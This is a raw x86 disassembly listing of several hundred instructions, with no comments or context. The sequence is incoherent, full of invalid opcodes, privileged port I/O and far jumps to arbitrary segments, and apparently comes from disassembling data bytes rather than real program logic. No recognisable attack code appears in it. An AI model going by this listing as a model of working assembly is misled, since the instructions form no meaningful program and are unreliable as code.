  405e15:	pop    edi
  405e16:	push   ds
  405e17:	xor    eax,0x3d93e436
  405e1c:	lsl    esi,cx
  405e1f:	xchg   ecx,eax
  405e20:	lea    ebp,[ecx+ebp*1+0x2fa92668]
  405e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e28:	bt     DWORD PTR [ecx-0x6767af1c],ecx
  405e2f:	pop    ebp
  405e30:	fld    QWORD PTR [ecx-0xf444b21]
  405e36:	iret   
  405e37:	dec    ebp
  405e38:	adc    DWORD PTR [ebp+0x3b],eax
  405e3b:	stos   BYTE PTR es:[edi],al
  405e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e3d:	push   0xfffffff5
  405e3f:	stos   BYTE PTR es:[edi],al
  405e40:	std    
  405e41:	sub    DWORD PTR [esi+0x6606d4ce],edx
  405e47:	push   ss
  405e48:	in     al,dx
  405e49:	outs   dx,BYTE PTR ds:[esi]
  405e4a:	ficomp DWORD PTR [ebp-0x11]
  405e4d:	addr16 std 
  405e4f:	push   ss
  405e50:	popf   
  405e51:	sbb    dh,BYTE PTR [esi-0x6ea4c0c3]
  405e57:	pop    ds
  405e58:	sbb    cl,BYTE PTR [ebx-0x4e]
  405e5b:	dec    edi
  405e5c:	mov    ebp,edx
  405e5e:	jmp    0x40af:0x16638762
  405e65:	sbb    BYTE PTR [ecx+0xb],bl
  405e68:	or     al,BYTE PTR [eax-0x67]
  405e6b:	retf   
  405e6c:	pop    ebx
  405e6d:	sbb    al,0x6b
  405e6f:	sti    
  405e70:	pushf  
  405e71:	test   eax,0x4a9050c0
  405e76:	repnz shl BYTE PTR [ebx+0x64],cl
  405e7a:	mov    ebx,0x308f2f4d
  405e7f:	sub    BYTE PTR ds:0xe8514311,al
  405e85:	sbb    edx,DWORD PTR [eax-0x415072b4]
  405e8b:	aad    0xc9
  405e8d:	retf   0x99cb
  405e90:	(bad)  
  405e91:	aas    
  405e92:	pushw  es
  405e94:	lahf   
  405e95:	push   edi
  405e96:	test   al,0x9e
  405e98:	sti    
  405e99:	pop    ebp
  405e9a:	push   edx
  405e9b:	sbb    BYTE PTR [esi],ah
  405e9d:	call   0x6df3:0x7a4466c1
  405ea4:	lods   eax,DWORD PTR ds:[esi]
  405ea5:	mov    edx,0xe0eef057
  405eaa:	lds    edx,FWORD PTR [eax]
  405eac:	shl    BYTE PTR [ebp-0x4612871b],1
  405eb2:	adc    dh,BYTE PTR [edx-0x7027d1d5]
  405eb8:	push   es
  405eb9:	mov    dx,0x6ace
  405ebd:	out    dx,eax
  405ebe:	jns    0x405ef9
  405ec0:	mov    eax,0x686c8bf5
  405ec5:	push   edx
  405ec6:	jmp    0x405ede
  405ec8:	les    ebp,FWORD PTR [ebp-0x5d]
  405ecb:	cmp    esi,ebx
  405ecd:	fld    st(5)
  405ecf:	jmp    0x405eed
  405ed1:	int3   
  405ed2:	imul   ebp,DWORD PTR [ebx],0x3b
  405ed5:	mov    edi,0xbe15323d
  405eda:	and    ah,al
  405edc:	and    BYTE PTR [edx+0x69bf511],dl
  405ee2:	push   ecx
  405ee3:	in     al,0xfc
  405ee5:	ds je  0x405f10
  405ee8:	gs or  al,0xff
  405eeb:	push   0xffffff93
  405eed:	xor    BYTE PTR [ebx+0x29e04abb],ch
  405ef3:	pusha  
  405ef4:	rcr    al,1
  405ef6:	or     edx,DWORD PTR [ebx]
  405ef8:	sub    BYTE PTR [ecx+0x5],0xc0
  405efc:	mov    bl,0x91
  405efe:	and    BYTE PTR [ecx],ah
  405f00:	sub    cl,BYTE PTR [edi+0x2efd3d5]
  405f06:	pushf  
  405f07:	das    
  405f08:	jmp    0x405f5d
  405f0a:	mov    al,ds:0xfe9347c0
  405f0f:	call   0x20d:0xdb69bc47
  405f16:	stos   BYTE PTR es:[edi],al
  405f17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f18:	dec    esi
  405f19:	or     edi,DWORD PTR [eax+0x4f3ee079]
  405f1f:	dec    esp
  405f20:	adc    cl,dl
  405f22:	push   edi
  405f23:	dec    edx
  405f24:	mov    bh,0xce
  405f26:	fbstp  TBYTE PTR [esi*8-0x5f89888b]
  405f2d:	test   DWORD PTR [edx],ebx
  405f2f:	push   ds
  405f30:	imul   ecx,DWORD PTR [edx-0x555c386],0xd357dbdc
  405f3a:	and    edi,DWORD PTR [ebx+ebp*2]
  405f3d:	lock and al,0xec
  405f40:	jns    0x405f62
  405f42:	cmp    ah,BYTE PTR ds:[edx+0x17]
  405f46:	or     al,0x0
  405f48:	pop    esp
  405f49:	mov    ebp,0x340874fb
  405f4e:	or     eax,0x1944742a
  405f53:	es pop ds
  405f55:	xchg   esi,eax
  405f56:	pop    si
  405f58:	int3   
  405f59:	mov    dl,0x10
  405f5b:	jmp    0x405ef3
  405f5d:	fadd   QWORD PTR [eax-0x6177f888]
  405f63:	push   ecx
  405f64:	cmc    
  405f65:	sbb    BYTE PTR ds:0xb6006f66,al
  405f6b:	adc    ecx,edx
  405f6d:	cwde   
  405f6e:	das    
  405f6f:	and    esp,DWORD PTR [edi-0x7]
  405f72:	mov    edi,0x695793bf
  405f77:	dec    ecx
  405f78:	jg     0x405f28
  405f7a:	sub    bh,BYTE PTR [esi-0x24bfba06]
  405f80:	enter  0x407d,0x4f
  405f84:	prefetch BYTE PTR [ebx-0x2c99a8d5]
  405f8b:	or     eax,esp
  405f8d:	add    BYTE PTR [edx+0x3e136d2a],dh
  405f93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f94:	fmul   st(7),st
  405f96:	cwde   
  405f97:	aas    
  405f98:	call   0xbe46:0x10ca7412
  405f9f:	outs   dx,DWORD PTR ds:[esi]
  405fa0:	ja     0x405f2d
  405fa2:	ror    DWORD PTR [edi],1
  405fa4:	cmp    BYTE PTR [edx],dl
  405fa6:	jmp    0x616bd292
  405fab:	jp     0x405fa1
  405fad:	jle    0x405fb0
  405faf:	xor    eax,0xb58984e4
  405fb4:	sub    edx,edi
  405fb6:	out    dx,al
  405fb7:	hlt    
  405fb8:	daa    
  405fb9:	dec    edi
  405fba:	adc    BYTE PTR [ebx+0x2c],dh
  405fbd:	loope  0x405f7a
  405fbf:	and    esi,esp
  405fc1:	loope  0x405f69
  405fc3:	mov    dh,BYTE PTR [eax-0x1091de15]
  405fc9:	loopne 0x40602b
  405fcb:	adc    BYTE PTR [ebx-0x1a0a98fa],0xd8
  405fd2:	loop   0x405fca
  405fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fd5:	mov    ds:0xf6ead088,eax
  405fda:	aaa    
  405fdb:	xchg   ebx,eax
  405fdc:	inc    esp
  405fdd:	adc    DWORD PTR [edx+ebx*1],esp
  405fe0:	fcomp  QWORD PTR [esi-0x272a330a]
  405fe6:	xchg   ecx,eax
  405fe7:	(bad)  
  405fe8:	mov    eax,0xd9ad031
  405fed:	or     ebp,ebp
  405fef:	inc    edx
  405ff0:	add    bh,cl
  405ff2:	pop    ecx
  405ff3:	xor    al,0x19
  405ff5:	stos   BYTE PTR es:[edi],al
  405ff6:	xor    dh,BYTE PTR [eax+edi*4+0x1ffd6cc1]
  405ffd:	sbb    edi,ecx
  405fff:	repz imul ebp,DWORD PTR [esi+0x5b038187],0x48
  406007:	ss cs out dx,eax
  40600a:	outs   dx,DWORD PTR ds:[esi]
  40600b:	inc    edx
  40600c:	retf   
  40600d:	into   
  40600e:	ret    0x143d
  406011:	rcl    DWORD PTR [edi+eiz*1+0x4c825f79],cl
  406018:	push   es
  406019:	imul   eax,DWORD PTR [ebp-0x732bdce8],0x6a223c79
  406023:	sbb    dh,bh
  406025:	cmp    ch,BYTE PTR [edi-0x5]
  406028:	sub    BYTE PTR [ebx+edi*1-0x11],ch
  40602c:	cmp    dh,dh
  40602e:	jnp    0x405fe6
  406030:	push   ecx
  406031:	jmp    0x2b37:0xd48ea953
  406038:	sbb    edx,DWORD PTR [edi+0x55f7d44a]
  40603e:	pop    ebx
  40603f:	arpl   WORD PTR [ebx+0x4],ax
  406042:	or     eax,0x6d5d9e99
  406047:	aaa    
  406048:	xchg   ecx,eax
  406049:	les    ecx,FWORD PTR [ebx+0x8]
  40604c:	fwait
  40604d:	mov    esp,gs
  40604f:	jbe    0x4060c2
  406051:	cld    
  406052:	pop    es
  406053:	in     al,0x8a
  406055:	out    0xe1,eax
  406057:	sbb    ecx,DWORD PTR [esi+0x53]
  40605a:	mov    bh,0x23
  40605c:	push   0x38f186d9
  406061:	or     esp,DWORD PTR [esi+0x6e24576e]
  406067:	push   0x17
  406069:	test   al,0xac
  40606b:	fnstcw WORD PTR [esp+edx*8]
  40606e:	adc    esi,DWORD PTR [edi+0x330f5fa1]
  406074:	pop    ss
  406075:	pop    eax
  406076:	jmp    0x3c2d:0x4f3e8a28
  40607d:	push   ss
  40607e:	or     DWORD PTR [ecx],ebx
  406080:	push   ss
  406081:	leave  
  406082:	ret    
  406083:	or     esi,ebx
  406085:	ficomp WORD PTR [ecx+0x439bf517]
  40608b:	or     edi,DWORD PTR [edi-0x19]
  40608e:	(bad)  
  40608f:	sti    
  406090:	test   al,0xe2
  406092:	push   0xdef6a6de
  406097:	push   edi
  406098:	bound  edx,QWORD PTR [edx+0x6a]
  40609b:	cmc    
  40609c:	inc    ebx
  40609d:	dec    esi
  40609e:	out    dx,eax
  40609f:	leave  
  4060a0:	lds    ebp,FWORD PTR [edi]
  4060a2:	dec    ebx
  4060a3:	inc    eax
  4060a4:	xor    BYTE PTR [esi+edx*4-0x4f],dh
  4060a8:	hlt    
  4060a9:	out    dx,eax
  4060aa:	mov    edx,0xaec3edad
  4060af:	loop   0x4060d8
  4060b1:	cld    
  4060b2:	ins    DWORD PTR es:[edi],dx
  4060b3:	cli    
  4060b4:	pop    edi
  4060b5:	ret    
  4060b6:	pop    ebx
  4060b7:	sub    BYTE PTR [ecx+0x66e9efe7],ah
  4060bd:	jl     0x4060b8
  4060bf:	jb     0x4060c8
  4060c1:	cdq    
  4060c2:	es mov bh,0x26
  4060c5:	push   esi
  4060c6:	call   0x43b2:0x8e979191
  4060cd:	push   ss
  4060ce:	sbb    al,0x93
  4060d0:	addr16 cli 
  4060d2:	inc    esp
  4060d3:	cmp    bh,0xec
  4060d6:	enter  0xfec0,0xd
  4060da:	fnstsw WORD PTR [edi+0x7d]
  4060dd:	mov    al,0x9
  4060df:	mov    eax,ds:0x547932b1
  4060e4:	cli    
  4060e5:	dec    edx
  4060e6:	(bad)  
  4060e7:	add    al,BYTE PTR [ebx-0x7e]
  4060ea:	or     ch,0x4e
  4060ed:	jl     0x40611e
  4060ef:	sahf   
  4060f0:	sub    DWORD PTR [edx+edx*4],ebx
  4060f3:	aaa    
  4060f4:	outs   dx,BYTE PTR ds:[esi]
  4060f5:	cmp    BYTE PTR [edx],dl
  4060f7:	jb     0x40613e
  4060f9:	xor    BYTE PTR [ebp+0x3d67614a],ah
  4060ff:	loope  0x406175
  406101:	cmc    
  406102:	fs (bad) 
  406104:	in     eax,dx
  406105:	sub    eax,0xb63d2acb
  40610a:	adc    BYTE PTR [eax-0x7b8f2cf9],bl
  406110:	mov    edx,DWORD PTR [ebp+0x55c9c08e]
  406116:	and    dl,BYTE PTR [esi-0x78]
  406119:	ds aad 0xdb
  40611c:	cmp    eax,0x6d4a1608
  406121:	pop    eax
  406122:	adc    cl,BYTE PTR [ecx-0x12]
  406125:	imul   esp,DWORD PTR ds:0x963e0354,0xf1e7906f
  40612f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406130:	adc    BYTE PTR [ecx],dl
  406132:	inc    eax
  406133:	mov    esp,0x2a1389ac
  406138:	jnp    0x406127
  40613a:	pop    ebx
  40613b:	mov    WORD PTR [edx],ss
  40613d:	lods   eax,DWORD PTR ds:[esi]
  40613e:	mov    ch,0x6
  406140:	test   eax,0x3b89366d
  406145:	cmp    edx,DWORD PTR [edi]
  406147:	push   0x76
  406149:	xor    DWORD PTR [ebp-0x495fc38a],edi
  40614f:	jg     0x136c0b66
  406155:	ret    
  406156:	mov    dh,0x20
  406158:	ss pop ebp
  40615a:	xchg   ebp,eax
  40615b:	ror    BYTE PTR [eax-0x602abc21],0x5b
  406162:	repz int3 
  406164:	imul   ecx,DWORD PTR [ebx+0x4e],0x43b5de4c
  40616b:	scas   al,BYTE PTR es:[edi]
  40616c:	mov    dh,0xe4
  40616e:	mov    esp,0x86b67c7
  406173:	mov    ebx,0xb0b46c4c
  406178:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40617a:	sbb    ebp,eax
  40617c:	and    al,BYTE PTR [ebx+0x14]
  40617f:	cmp    esi,eax
  406181:	ins    DWORD PTR es:[edi],dx
  406182:	xchg   DWORD PTR es:[ebx-0x540cf9be],ebp
  406189:	cld    
  40618a:	out    0xa0,eax
  40618c:	scas   al,BYTE PTR es:[edi]
  40618d:	inc    esp
  40618e:	fwait
  40618f:	pop    edi
  406190:	and    BYTE PTR [edi+0x3a],cl
  406193:	mov    edi,0xff954774
  406198:	jmp    0x191:0xb2390b61
  40619f:	loop   0x4061ae
  4061a1:	xor    ecx,DWORD PTR [ecx]
  4061a3:	loopne 0x40617b
  4061a5:	sub    al,0xc5
  4061a7:	rcr    BYTE PTR [edx+esi*1+0x5a],1
  4061ab:	push   ss
  4061ac:	dec    eax
  4061ad:	jge    0x406194
  4061af:	adc    al,0xf0
  4061b1:	scas   eax,DWORD PTR es:[edi]
  4061b2:	pop    ss
  4061b3:	stc    
  4061b4:	and    al,0x25
  4061b6:	ds das 
  4061b8:	push   ds
  4061b9:	or     edx,DWORD PTR [edi-0x17]
  4061bc:	adc    al,0x7a
  4061be:	adc    al,0xfe
  4061c0:	sbb    al,BYTE PTR [edi]
  4061c2:	mov    al,al
  4061c4:	pop    esi
  4061c5:	arpl   bp,sp
  4061c7:	mov    esp,0xbdc42de8
  4061cc:	(bad)  
  4061cd:	fldl2t 
  4061cf:	mov    BYTE PTR [edx-0x58bcc979],0x23
  4061d6:	scas   eax,DWORD PTR es:[edi]
  4061d7:	push   0x58
  4061d9:	xor    DWORD PTR ds:0xe9f9483a,edx
  4061df:	lods   al,BYTE PTR ds:[esi]
  4061e0:	sar    esi,cl
  4061e2:	xchg   ebx,eax
  4061e3:	mov    esi,0xe6804081
  4061e8:	ins    BYTE PTR es:[edi],dx
  4061e9:	std    
  4061ea:	xbegin 0xa43d0489
  4061f0:	call   0x437264b
  4061f5:	add    DWORD PTR [eax+ebp*2-0x11fbf5f1],edi
  4061fc:	dec    ecx
  4061fd:	rcr    DWORD PTR [ecx-0x4c],1
  406200:	cmp    eax,0x31fd884d
  406205:	jle    0x40620d
  406207:	xchg   ebx,eax
  406208:	ficomp DWORD PTR [edi-0x17a6022]
  40620e:	fwait
  40620f:	(bad)  
  406210:	push   fs
  406212:	mov    cl,0x36
  406214:	mov    dh,0xac
  406216:	push   DWORD PTR [edi-0x5996117b]
  40621c:	std    
  40621d:	jo     0x40627f
  40621f:	fwait
  406220:	std    
  406221:	xchg   ebp,eax
  406222:	aad    0x67
  406224:	pop    edx
  406225:	adc    al,bh
  406227:	adc    al,0x31
  406229:	cmp    DWORD PTR [esi-0x14041e2a],0xffffffe1
  406230:	sbb    al,0xd3
  406232:	push   0x5736a08a
  406237:	ret    0x9e60
  40623a:	fimul  WORD PTR [esi+eiz*8]
  40623d:	push   ecx
  40623e:	adc    al,0x86
  406240:	push   ebp
  406241:	(bad)  [edx]
  406243:	test   DWORD PTR [edx+0x25f25dcd],esi
  406249:	xchg   edx,eax
  40624a:	loopne 0x406271
  40624c:	into   
  40624d:	push   ss
  40624e:	cmp    BYTE PTR [edx+0x6980845],ch
  406254:	pop    edx
  406255:	gs in  al,dx
  406257:	in     eax,0x78
  406259:	jl     0x4062d6
  40625b:	mov    ebx,0x180e5868
  406260:	mov    dh,0x9e
  406262:	stc    
  406263:	inc    esp
  406264:	pop    ecx
  406265:	cmp    bh,BYTE PTR [eax+0x46f0bfda]
  40626b:	pop    ds
  40626c:	lods   al,BYTE PTR ds:[esi]
  40626d:	shl    dh,1
  40626f:	cmp    BYTE PTR [edi],bl
  406271:	xlat   BYTE PTR ds:[ebx]
  406272:	or     BYTE PTR [esi+0x71142db6],ah
  406278:	aaa    
  406279:	sbb    dh,BYTE PTR [edi]
  40627b:	mov    ecx,eax
  40627d:	(bad)  
  40627e:	je     0x4062c5
  406280:	cwde   
  406281:	popa   
  406282:	scas   al,BYTE PTR es:[edi]
  406283:	sub    dl,BYTE PTR [esi+edx*1]
  406286:	xchg   BYTE PTR [edi+0xb62568c],bh
  40628c:	ss pop esi
  40628e:	mov    cl,dl
  406290:	hlt    
  406291:	lods   al,BYTE PTR ds:[esi]
  406292:	fstp   st(4)
  406294:	(bad)  
  406295:	test   al,0x4d
  406297:	jl     0x406290
  406299:	dec    ecx
  40629a:	imul   eax,DWORD PTR [edi+0x1e],0xf2d626ac
  4062a1:	push   edx
  4062a2:	cmc    
  4062a3:	jge    0x40625a
  4062a5:	jno    0x4062de
  4062a7:	int    0xd9
  4062a9:	in     eax,dx
  4062aa:	loope  0x406322
  4062ac:	pop    ds
  4062ad:	inc    edx
  4062ae:	dec    ecx
  4062af:	jne    0x40628c
  4062b1:	dec    ecx
  4062b2:	fdiv   QWORD PTR [edi-0x64]
  4062b5:	xchg   DWORD PTR [ecx-0x4e6fd50],edi
  4062bb:	fistp  QWORD PTR [ecx-0x12]
  4062be:	jno    0x406304
  4062c0:	add    al,0x7f
  4062c2:	dec    ebp
  4062c3:	(bad)  
  4062c4:	pusha  
  4062c5:	neg    DWORD PTR [eax+0x45320635]
  4062cb:	ins    BYTE PTR es:[edi],dx
  4062cc:	mov    DWORD PTR [esi-0x17],edi
  4062cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062d0:	mov    ebx,0x568fd911
  4062d5:	sbb    bh,bh
  4062d7:	mov    bh,0xb4
  4062d9:	daa    
  4062da:	ret    
  4062db:	sbb    BYTE PTR [esi+0x61f458a3],ch
  4062e1:	xor    edx,DWORD PTR [edx+0x45]
  4062e4:	out    dx,eax
  4062e5:	push   ds
  4062e6:	sti    
  4062e7:	dec    edx
  4062e8:	das    
  4062e9:	cli    
  4062ea:	xchg   ebp,eax
  4062eb:	cmp    bl,BYTE PTR [edi+0x4e]
  4062ee:	xor    DWORD PTR [ecx+0x79a6333f],edi
  4062f4:	dec    eax
  4062f5:	cmp    eax,0xb741cf1e
  4062fa:	xchg   edi,eax
  4062fb:	push   ecx
  4062fc:	mov    BYTE PTR ds:0xce65f0a9,0x98
  406303:	inc    ebx
  406304:	pop    es
  406305:	(bad)  
  406306:	nop
  406307:	pusha  
  406308:	imul   esp,DWORD PTR [esi-0x4e6ebd64],0x5b7e1fc3
  406312:	mov    edx,DWORD PTR [edi-0x4e]
  406315:	sbb    BYTE PTR [ecx-0x7d],al
  406318:	xchg   ebp,eax
  406319:	mov    ah,0xc
  40631b:	test   ax,0x1d4f
  40631f:	(bad)  
  406320:	ins    BYTE PTR es:[edi],dx
  406321:	xchg   ebx,eax
  406322:	cmp    ebp,DWORD PTR [ecx+0x14]
  406325:	push   ss
  406326:	fwait
  406327:	jo     0x406364
  406329:	jb     0x4062fb
  40632b:	or     eax,0x94a4aaf0
  406330:	ret    0x5548
  406333:	cld    
  406334:	fidiv  DWORD PTR [edi]
  406336:	mov    es,WORD PTR [eax-0x38]
  406339:	pop    ss
  40633a:	call   0xaf3a1e52
  40633f:	mov    edi,ds
  406341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406342:	xchg   ecx,eax
  406343:	mov    WORD PTR [ebx-0x2bc10575],?
  406349:	enter  0x561d,0xb6
  40634d:	sbb    ecx,DWORD PTR [ebp-0x7f]
  406350:	jge    0x406342
  406352:	(bad)  
  406353:	fnstcw WORD PTR [esi+esi*2-0x31]
  406357:	cmp    eax,0x10dc2462
  40635c:	cvtdq2ps xmm3,xmm3
  40635f:	and    BYTE PTR [ecx+0x51],0x28
  406363:	pop    ebx
  406364:	ret    
  406365:	outs   dx,BYTE PTR ds:[esi]
  406366:	sbb    edx,edx
  406368:	pop    ds
  406369:	ror    BYTE PTR [eax+ecx*8+0x1a],1
  40636d:	outs   dx,DWORD PTR ds:[esi]
  40636e:	in     eax,dx
  40636f:	push   eax
  406370:	jns    0x40631a
  406372:	lods   eax,DWORD PTR ds:[esi]
  406373:	push   edx
  406374:	mov    ds:0xc743d550,al
  406379:	stos   DWORD PTR es:[edi],eax
  40637a:	pop    es
  40637b:	add    ecx,DWORD PTR [edx]
  40637d:	adc    DWORD PTR [esi-0x34],edi
  406380:	inc    esi
  406381:	pop    ds
  406382:	inc    edx
  406383:	pop    esp
  406384:	dec    esi
  406385:	sub    esp,ebp
  406387:	fwait
  406388:	int    0x5c
  40638a:	mov    DWORD PTR [ebx-0x51721389],eax
  406390:	hlt    
  406391:	sbb    BYTE PTR [edx-0x6a8e7bb],cl
  406397:	pop    ss
  406398:	stos   DWORD PTR es:[edi],eax
  406399:	enter  0x456f,0x2
  40639d:	add    dl,dh
  40639f:	adc    eax,0x1ef60985
  4063a4:	xor    ecx,ebx
  4063a6:	aaa    
  4063a7:	mov    bh,0xb2
  4063a9:	inc    ebp
  4063aa:	fldcw  WORD PTR [edx-0x2a6ef1ca]
  4063b0:	jbe    0x4063cb
  4063b2:	cmp    ecx,esp
  4063b4:	mov    bh,0xd8
  4063b6:	dec    ebx
  4063b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063b8:	xchg   ebp,eax
  4063ba:	sbb    ebp,esp
  4063bc:	mov    al,0x4f
  4063be:	das    
  4063bf:	mov    dh,0x3c
  4063c1:	stos   BYTE PTR es:[edi],al
  4063c2:	add    DWORD PTR [ebx],ebp
  4063c4:	mov    bh,0x64
  4063c6:	mov    al,BYTE PTR [ecx+eax*8]
  4063c9:	repnz push ebx
  4063cb:	jnp    0x4063ce
  4063cd:	lods   eax,DWORD PTR ds:[esi]
  4063ce:	and    dh,cl
  4063d0:	out    0x54,al
  4063d2:	sbb    al,0x18
  4063d4:	cmp    cl,BYTE PTR [ebp+0x27]
  4063d7:	popa   
  4063d8:	fiadd  WORD PTR [ecx-0x7e]
  4063db:	ficomp DWORD PTR ds:0xd778801f
  4063e1:	mov    ds:0x5f270692,eax
  4063e6:	push   ebx
  4063e7:	out    dx,eax
  4063e8:	es dec edi
  4063ea:	add    eax,0xdadb36b9
  4063ef:	push   ebp
  4063f0:	loop   0x4063bb
  4063f2:	in     al,dx
  4063f3:	jle    0x406395
  4063f5:	ror    DWORD PTR [ecx],1
  4063f7:	pop    ss
  4063f8:	je     0x406410
  4063fa:	out    dx,eax
  4063fb:	jne    0x406465
  4063fd:	div    BYTE PTR es:[edx+0x4c7f6185]
  406404:	lock mov eax,0x849908f2
  40640a:	in     eax,dx
  40640b:	dec    ebx
  40640c:	test   WORD PTR ds:0xc830dcf2,cx
  406413:	pop    ds
  406414:	mov    BYTE PTR [ebx+0x7e227c8f],dh
  40641a:	mov    ebx,0x4c6c336a
  40641f:	std    
  406420:	dec    edi
  406421:	cmp    al,0x45
  406423:	push   cs
  406424:	jmp    0x4063c2
  406426:	and    BYTE PTR [ecx],al
  406428:	test   esp,edi
  40642a:	sbb    al,0xf0
  40642c:	xchg   ebx,eax
  40642d:	cld    
  40642e:	and    esp,DWORD PTR [ebx-0x8f1e671]
  406434:	push   cs
  406435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406436:	pusha  
  406437:	jno    0x40641e
  406439:	bound  edi,QWORD PTR [ebx-0x80]
  40643c:	xchg   edi,eax
  40643d:	push   esi
  40643e:	enter  0x6b7f,0xf
  406442:	mov    BYTE PTR [edi+ebx*8+0x6b5ca0f6],ch
  406449:	push   ebx
  40644a:	loopne 0x40642c
  40644c:	arpl   WORD PTR [ebx-0x2255cb55],sp
  406452:	(bad)  
  406453:	and    eax,0xa3e8ffbb
  406458:	(bad)  
  406459:	iret   
  40645a:	mov    WORD PTR [ecx+0x35],?
  40645d:	sub    al,0xc0
  40645f:	inc    esp
  406460:	jge    0x406432
  406462:	pop    esi
  406463:	out    0x67,al
  406465:	arpl   WORD PTR [ebx],di
  406467:	sub    DWORD PTR [edi+0x2f42b0f8],edi
  40646d:	retf   
  40646e:	sub    bh,BYTE PTR [edx-0x55bfb0e1]
  406474:	mov    bh,0xe1
  406476:	cli    
  406477:	jne    0x4064d3
  406479:	mov    eax,ds:0x857cb402
  40647e:	inc    ecx
  40647f:	xor    al,BYTE PTR [esi]
  406481:	xor    ah,ah
  406483:	(bad)  
  406484:	dec    edx
  406485:	out    dx,al
  406486:	and    al,0x29
  406488:	dec    eax
  406489:	fist   DWORD PTR [ebp-0x55]
  40648c:	je     0x4064f3
  40648e:	mov    dl,0xc7
  406490:	mov    eax,ds:0x33f0b4a7
  406495:	adc    BYTE PTR [ebx-0x7d],cl
  406498:	mov    edi,0xf96d1030
  40649d:	fsubr  DWORD PTR [esi-0x3af070d4]
  4064a3:	lock mov WORD PTR [edx-0x70],es
  4064a7:	dec    edx
  4064a8:	jmp    0x297e:0x1f534346
  4064af:	inc    esp
  4064b0:	sbb    ecx,DWORD PTR ds:0xea184327
  4064b6:	leave  
  4064b7:	das    
  4064b8:	cli    
  4064b9:	mov    ch,0x74
  4064bb:	mov    gs,WORD PTR [edi+0x659024be]
  4064c1:	test   BYTE PTR [ebx-0x5a],al
  4064c4:	and    BYTE PTR [eax-0x2e],dh
  4064c7:	cmp    ebp,edi
  4064c9:	inc    eax
  4064ca:	push   ebx
  4064cb:	sar    BYTE PTR [ecx-0x41098bec],cl
  4064d1:	or     esi,eax
  4064d3:	daa    
  4064d4:	and    al,BYTE PTR [ecx-0x50859ad7]
  4064da:	adc    bl,BYTE PTR [esi-0x2c]
  4064dd:	retf   
  4064de:	mov    ds:0x42451542,eax
  4064e3:	cmp    BYTE PTR [esi],0x1c
  4064e6:	ins    DWORD PTR es:[edi],dx
  4064e7:	pop    esi
  4064e8:	pmaxsw mm7,QWORD PTR [ebx+0x49]
  4064ec:	mov    esi,0x2226b890
  4064f1:	inc    ebx
  4064f2:	cmp    DWORD PTR [ecx+0x5f],ebp
  4064f5:	add    al,0x2f
  4064f7:	mov    eax,ds:0x3276b057
  4064fc:	adc    eax,0xb9c6422f
  406501:	aaa    
  406502:	outs   dx,DWORD PTR ds:[esi]
  406503:	xchg   ebp,eax
  406504:	sub    DWORD PTR [edx+0x14309190],edx
  40650a:	pop    edx
  40650b:	lods   eax,DWORD PTR ds:[esi]
  40650c:	ds rcr esi,cl
  40650f:	mov    ebp,0xc4d8ef5a
  406514:	shr    BYTE PTR [eax+ecx*4-0x7f399518],1
  40651b:	arpl   WORD PTR [edx-0x1d],sp
  40651e:	je     0x40655d
  406520:	loope  0x406528
  406522:	int    0x70
  406524:	popa   
  406525:	jle    0x4064cd
  406527:	xor    DWORD PTR [esi-0x681c3313],0xffffffd4
  40652e:	bound  ebx,QWORD PTR [esi]
  406530:	lahf   
  406531:	push   eax
  406532:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406533:	mov    esp,0x64a6bcee
  406538:	dec    ecx
  406539:	ja     0x4065a7
  40653b:	shl    DWORD PTR [edx+0x313ba2bb],0xae
  406542:	sbb    al,BYTE PTR [edx-0x23]
  406545:	rcl    BYTE PTR [eax],0xef
  406548:	enter  0xd262,0xa
  40654c:	mov    cl,0x18
  40654e:	scas   eax,DWORD PTR es:[edi]
  40654f:	sub    DWORD PTR [esi],ebp
  406551:	repz add esp,eax
  406554:	jl     0x4065d2
  406556:	and    BYTE PTR [esi-0x31],0x17
  40655a:	dec    ecx
  40655b:	and    al,0x2e
  40655d:	cwde   
  40655e:	jo     0x406597
  406560:	mov    edi,DWORD PTR [edi-0x27]
  406563:	enter  0xe974,0x66
  406567:	push   ds
  406568:	push   esp
  406569:	iret   
  40656a:	jmp    0x406514
  40656c:	jecxz  0x4065be
  40656e:	lahf   
  40656f:	outs   dx,BYTE PTR ds:[esi]
  406570:	xchg   ebx,eax
  406571:	int    0x16
  406573:	cmp    dl,BYTE PTR [esi]
  406575:	adc    ecx,DWORD PTR [esi]
  406577:	cmp    bl,bl
  406579:	test   al,0xe1
  40657b:	out    0xa6,al
  40657d:	jp     0x406575
  40657f:	sub    ebp,esi
  406581:	mov    bl,0xcf
  406583:	adc    al,0xf1
  406585:	cld    
  406586:	fcom   QWORD PTR [ebp+0x56]
  406589:	fisubr DWORD PTR [ecx-0x7b]
  40658c:	push   0xffffffff
  40658e:	dec    eax
  40658f:	sbb    esp,ebp
  406591:	(bad)  
  406592:	xchg   edi,eax
  406593:	(bad)  
  406594:	pop    eax
  406595:	jnp    0x4065ff
  406597:	xor    DWORD PTR [ecx],ecx
  406599:	outs   dx,DWORD PTR ds:[esi]
  40659a:	int3   
  40659b:	fidiv  WORD PTR gs:[edx-0x23]
  40659f:	pop    edx
  4065a0:	outs   dx,DWORD PTR ds:[esi]
  4065a1:	or     al,0xe5
  4065a3:	cdq    
  4065a4:	mov    ch,0x29
  4065a6:	mov    eax,ds:0x4fe98c2d
  4065ab:	fs aas 
  4065ad:	inc    edi
  4065ae:	cld    
  4065af:	xchg   ecx,eax
  4065b0:	cmc    
  4065b1:	fist   DWORD PTR [ebx+0x54]
  4065b4:	call   0x409f:0x9c147748
  4065bb:	sbb    eax,0x15b10f06
  4065c0:	mov    dh,0x6c
  4065c2:	inc    edx
  4065c3:	dec    edi
  4065c4:	jmp    0x406547
  4065c6:	mov    ebp,ebp
  4065c8:	cmp    DWORD PTR [ecx-0x6afa4948],esp
  4065ce:	test   DWORD PTR [ebp+0x1c],esi
